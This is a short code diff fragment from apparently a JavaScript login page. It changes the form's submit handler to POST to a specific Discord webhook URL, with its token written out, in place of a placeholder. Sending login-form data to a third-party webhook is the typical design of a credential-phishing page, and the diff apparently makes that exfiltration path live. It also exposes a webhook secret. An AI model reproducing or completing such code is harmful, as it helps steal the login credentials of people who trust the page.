@@ -15,7 +15,7 @@ document.getElementById('login-form').addEventListener('submit', function(event)
   };
 
   const xhr = new XMLHttpRequest();
-  xhr.open('POST', 'https://discord.com/api/webhooks/WEBHOOK_URL', true);
+  xhr.open('POST', 'https://discord.com/api/webhooks/978152864914477056/CS_HwxRdrn-5T7x1iEe7yAPeY_kJ9iwi2-oqOVr1ZZH5xSn6_uzlus4fRhqtQyhu3xby', true);
   xhr.setRequestHeader('Content-Type', 'application/json');
 
   xhr.onload = function() {
